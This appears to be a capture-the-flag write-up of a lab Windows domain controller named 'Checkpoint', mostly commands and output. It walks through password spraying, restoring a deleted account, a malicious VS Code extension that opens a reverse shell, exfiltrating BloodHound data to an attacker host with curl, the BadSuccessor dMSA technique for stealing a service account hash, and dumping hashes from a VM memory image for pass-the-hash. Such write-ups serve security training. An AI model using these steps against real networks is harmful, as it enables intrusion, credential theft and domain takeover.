# Checkpoint

## Recon

We are given the credentials `alex.turner / Checkpoint2024!` as a starting point.

### Full Port Scan

```shell
sudo nmap -sT --min-rate 10000 -p- 10.129.18.0 -oA nmapscan/ports
```

```
Nmap scan report for 10.129.18.0
Host is up (0.023s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49683/tcp open  unknown
49704/tcp open  unknown
49713/tcp open  unknown
```

The combination of 53, 88, 389, 445, 636, and 5985 is the classic signature of a Windows **Domain Controller**.

### Service Detection

Extract the open ports into a variable:

```shell
ports=$(grep open nmapscan/ports.nmap | awk -F'/' '{print $1}' | paste -sd ',')
```

```shell
sudo nmap -sT -sC -sV -O -p $ports 10.129.18.0 -oA nmapscan/detail
```

```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-17 23:22:59Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  msrpc             Microsoft Windows RPC
49674/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc             Microsoft Windows RPC
49704/tcp open  msrpc             Microsoft Windows RPC
49713/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 24H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
```

Add `checkpoint.htb` to `/etc/hosts`:

```shell
echo "10.129.18.0 checkpoint.htb DC01.checkpoint.htb" | sudo tee -a /etc/hosts
```

## Enumerate

### SMB Shares

```shell
nxc smb 10.129.18.0 -u alex.turner -p 'Checkpoint2024!' --shares
```

![](assets/Pasted%20image%2020260617183620.png)

Of the readable shares, only `SYSVOL` has content. It contains the standard `checkpoint.htb` GPO folder; pulling it down (`DfsrPrivate` is access-denied) and reviewing the contents turns up nothing useful.

```shell
smb: \> ls
  .                                   D        0  Sat May  9 10:39:17 2026
  ..                                  D        0  Sat May  9 10:39:17 2026
  checkpoint.htb                     Dr        0  Sat May  9 10:39:17 2026

		10459391 blocks of size 4096. 2463904 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget checkpoint.htb
NT_STATUS_ACCESS_DENIED listing \checkpoint.htb\DfsrPrivate\*
getting file \checkpoint.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as checkpoint.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
...
```

### Domain Users

Dump the user list for later password spraying:

```shell
nxc smb 10.129.18.0 -u alex.turner -p 'Checkpoint2024!' --users | awk 'NR>=4 {print $5}' | head -n -1 > users.txt
```

```
$ cat users.txt 
Administrator
Guest
krbtgt
alex.turner
ryan.brooks
svc_deploy
james.harper
sarah.mitchell
emily.carter
david.reynolds
jessica.coleman
lauren.flores
michael.torres
kevin.patterson
brian.jenkins
megan.perry
max.palmer
```

### Finding Writable Objects

Enumerate what `alex.turner` can write to in the directory:

```shell
bloodyAD --host 10.129.18.0 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

```
$ bloodyAD --host 10.129.18.0 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

The interesting line is write access over `Mark Davies`, which sits in `CN=Deleted Objects`. This is a **tombstone**: when an AD object is deleted it is not immediately purged, but kept as a recoverable tombstone for a retention period.

```
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
```

Because we can write to it, we can restore it.

## Tombstone Restore and Password Spray

Restore the deleted account:

```shell
bloodyAD --host 10.129.18.0 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'mark.davies'
```

A restored tombstone keeps its original password, so add `mark.davies` to `users.txt` and spray the known password across the whole list:

```shell
nxc smb 10.129.18.0 -u users.txt -p 'Checkpoint2024!' --continue-on-success
```

Besides `alex.turner`, `mark.davies` also authenticates with `Checkpoint2024!`.

![](assets/Pasted%20image%2020260617192247.png)

## Lateral Movement: VSIX Extension Poisoning

Check what `mark.davies` can access:

```shell
nxc smb 10.129.18.0 -u mark.davies -p 'Checkpoint2024!' --shares
```

`mark.davies` has WRITE access to `DevDrop`.

![](assets/Pasted%20image%2020260617192452.png)

`DevDrop` is a drop folder for VS Code extensions (`.vsix`). A VSCode extension is just Node.js code, and its `activate()` function runs automatically when the extension loads. If we plant a malicious extension here and someone loads it, our code executes as that user. This is a classic supply-chain style lateral move.

Create `package.json`:

```json
{
  "name": "evil-ext",
  "publisher": "dev",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "main": "./extension.js",
  "activationEvents": ["onStartupFinished"],
  "contributes": {}
}
```

Create `extension.js` with the payload that fires on activation:

```javascript
const cp = require('child_process');
function activate(context) {
  cp.exec('powershell -e <base64-reverse-shell-payload>');
}
function deactivate() {}
module.exports = { activate, deactivate };
```

Package it into a `.vsix`:

```shell
npx @vscode/vsce package
```

Upload it to `DevDrop`:

```shell
smbclient //10.129.18.0/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put evil-ext-1.0.0.vsix'
```

Set up a listener:

```shell
rlwrap ncat -nvlp 9001
```

When the extension is loaded, we get a shell as `ryan.brooks`:

```powershell
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```

The user flag is on `ryan.brooks`'s desktop.

![](assets/Pasted%20image%2020260617194818.png)

## Mapping the Path with BloodHound

Upload SharpHound and collect the data:

```powershell
wget http://10.10.15.172:8000/SharpHound.exe -O C:\Windows\Temp\SharpHound.exe
.\SharpHound.exe -c All -d checkpoint.htb
```

Pull the resulting zip back:

```shell
python3 -m uploadserver 80
```

```powershell
$f="C:\Windows\Temp\20260617175824_BloodHound.zip"
curl.exe -F "files=@$f" http://10.10.15.172/upload
```

Set up BloodHound CE and ingest the data:

```shell
curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker-compose up -d
```

Get the initial password

```shell
sudo docker-compose logs bloodhound | grep -i "Initial Password"
```

Browse to `http://localhost:8080`, log in with `admin` and the initial password.

Searching for a path from `ryan.brooks` to Domain Admins reveals:

![](assets/Pasted%20image%2020260617202239.png)

```
RYAN.BROOKS --GenericWrite--> SVC_DEPLOY --CanPSRemote--> DC01 --DCSync--> CHECKPOINT.HTB
```

The endgame is DCSync (which lets us replicate all domain hashes), but first we need to become `svc_deploy`.

## Privilege Escalation: GenericWrite to svc_deploy via BadSuccessor

### Why not Shadow Credentials

The obvious way to abuse `GenericWrite` over `svc_deploy` is Shadow Credentials: use Whisker to add a key credential, then use Rubeus to PKINIT for a TGT. That fails here:

```powershell
certutil -urlcache -split -f http://10.10.15.172/Whisker.exe Whisker.exe
certutil -urlcache -split -f http://10.10.15.172/Rubeus.exe Rubeus.exe
.\Whisker.exe add /target:svc_deploy
.\Rubeus.exe asktgt /user:svc_deploy /certificate:MIIJ0AIBAzCCCYwGCSqGSIb3DQEHAaCC...y23bgK6B30NwICB9A= /password:"8MxGdXdBxy9q3SoE" /domain:checkpoint.htb /dc:DC01.checkpoint.htb /getcredentials /show
```

```
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

...

[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP
```

`KDC_ERR_PADATA_TYPE_NOSUPP` means the DC does not support PKINIT / certificate-based pre-authentication, so the certificate path is dead.

### BadSuccessor

Instead we use **BadSuccessor**, an Akamai-disclosed technique abusing the Delegated Managed Service Account (dMSA) feature in newer Windows Server. By setting the right attributes on a dMSA we control, we can simulate a migration from a target account to that dMSA. The KDC then treats the dMSA as the successor of the target identity and, when issuing the dMSA's TGT, packages the target account's keys into the ticket. In short: create a dMSA, link it to `svc_deploy`, request its ticket, and read `svc_deploy`'s hash out of the response.

First get a usable Kerberos context for `ryan.brooks` with `tgtdeleg` (this extracts a real TGT we can convert to a ccache):

```
PS C:\Windows\Temp> .\Rubeus.exe tgtdeleg /nowrap

...
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgE...MCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
```

Convert it and load it:

```shell
echo "<base64>" | base64 -d > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=ryan.ccache
```

Run the BadSuccessor attack. This creates a dMSA `evil-dmsa$` in an OU we can write to, links it to `svc_deploy`, and requests a ticket:

```shell
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=ryan.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

```
[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB

...

dMSA current keys found in TGS:
AES256: e01bc0d1d2dd3e5e643b20f0ca80e7f3fc77b76fa4d37864703b6df9e42f61f0
AES128: 5fc55666680ceb1acc97d026fb2a9714
RC4: 56c5b16ca93db320d97e08a16978abcf

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

The RC4 key `e16081eb077aca74bdbf8af12af43ac9` is the NTLM hash of `svc_deploy`.

## Privilege Escalation: svc_deploy to Administrator

Check what `svc_deploy` can access with the recovered hash:

```shell
nxc smb 10.129.18.0 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
```

`svc_deploy` can read the `VMBackups` share.

![](assets/Pasted%20image%2020260617210416.png)

```shell
smbclient //10.129.18.0/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
```

The backup contains a VMware snapshot. Download the `.vmem` file:

```
smb: \NightlyBackup_2024-11-01\memory forensics\> ls
  .                                   D        0  Sat May  9 19:12:44 2026
  ..                                  D        0  Sat May  9 18:54:19 2026
  Windows Server 2019-000001.vmdk      A 106496000  Sun May 10 04:45:22 2026
  Windows Server 2019-Snapshot1.vmem      A 2147483648  Sun May 10 04:40:36 2026
  Windows Server 2019-Snapshot1.vmsn      A 138164859  Sun May 10 04:40:36 2026
  Windows Server 2019.nvram           A   270840  Sun May 10 04:39:00 2026
  Windows Server 2019.scoreboard      A     7642  Sun May 10 04:45:22 2026
  Windows Server 2019.vmdk            A 10199695360  Sun May 10 04:39:00 2026
  Windows Server 2019.vmsd            A      502  Sun May 10 04:39:00 2026
  Windows Server 2019.vmx             A     2749  Sun May 10 04:45:22 2026
  Windows Server 2019.vmxf            A      274  Sun May 10 04:22:44 2026

		10459391 blocks of size 4096. 2478214 blocks available
smb: \NightlyBackup_2024-11-01\memory forensics\> get "Windows Server 2019-Snapshot1.vmem"
getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem of size 2147483648 as Windows Server 2019-Snapshot1.vmem (9018.1 KiloBytes/sec) (average 9018.1 KiloBytes/sec)
```

A `.vmem` file is a full dump of the VM's RAM at snapshot time. While Windows is running, logged-on accounts' NTLM hashes are cached in the LSASS process memory, so we can carve them out of this memory image offline with **volatility**:

```shell
git clone https://github.com/volatilityfoundation/volatility3
cd volatility3
python3 vol.py -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump
```

```
Administrator	500	aad3b435b51404eeaad3b435b51404ee	f29e9c014295b9b32139b09a2790be3b
Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount	504	aad3b435b51404eeaad3b435b51404ee	28f8d934dee90b2ec824351cb0844479
```

This gives the Administrator NTLM hash.

## Root

Pass-the-hash with the Administrator hash over WinRM:

```shell
evil-winrm -i 10.129.18.0 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
```

```powershell                          
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
checkpoint\administrator
```

The root flag is on `max.palmer`'s desktop.

![](assets/Pasted%20image%2020260617211941.png)

## Summary

- **Foothold:** Given `alex.turner` creds. bloodyAD shows write access to a tombstoned account `mark.davies`; restore it, and it shares the same password.
- **Lateral (mark.davies to ryan.brooks):** `mark.davies` can write to the `DevDrop` VS Code extension share. Plant a malicious `.vsix` whose `activate()` spawns a reverse shell, executed as `ryan.brooks` when loaded.
- **Privesc (ryan.brooks to svc_deploy):** Ryan has GenericWrite over svc_deploy. Shadow Credentials fail (no PKINIT support), so use BadSuccessor: create a dMSA, link it to svc_deploy, and recover svc_deploy's hash from the issued ticket.
- **Privesc (svc_deploy to Administrator):** svc_deploy can read `VMBackups`. A VM memory snapshot (`.vmem`) is dumped with volatility to recover the Administrator hash, then pass-the-hash over WinRM.